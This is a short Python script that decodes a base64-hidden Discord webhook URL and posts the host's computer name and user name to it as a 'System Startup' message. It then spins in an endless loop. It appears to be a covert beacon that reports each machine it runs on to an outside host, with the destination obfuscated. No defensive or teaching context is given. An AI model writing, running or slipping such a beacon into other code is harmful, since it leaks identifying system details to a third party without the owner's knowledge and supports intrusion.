import base64
import json
import os
import socket
import urllib.request

# Base64-encoded Discord webhook URL
WEBHOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2MTM2NTkwMjUzOTg4NjYxNC96SDZnWkI4YXNzLTY3TTJVQkVXWFcwTGk2a21vOWtPc2NrOUhOZ0pBMk5Ea2JhYW1vbWs0cDQ4bzR1WGdwaUZFdjJwZA=="

def send_webhook(message):
    webhook_url = base64.b64decode(WEBHOOK_B64).decode("utf-8")
    data = json.dumps({"content": message}).encode("utf-8")

    req = urllib.request.Request(
        webhook_url,
        data=data,
        headers={"Content-Type": "application/json"}
    )
    urllib.request.urlopen(req, timeout=10)

if __name__ == "__main__":
    computer_name = os.environ.get("COMPUTERNAME", socket.gethostname())
    user_name = os.environ.get("USERNAME", "SYSTEM")

    msg = (
        "🖥️ **System Startup**\n"
        f"Computer: `{computer_name}`\n"
        f"User Context: `{user_name}`"
    )

    send_webhook(msg)

while True:
    pass
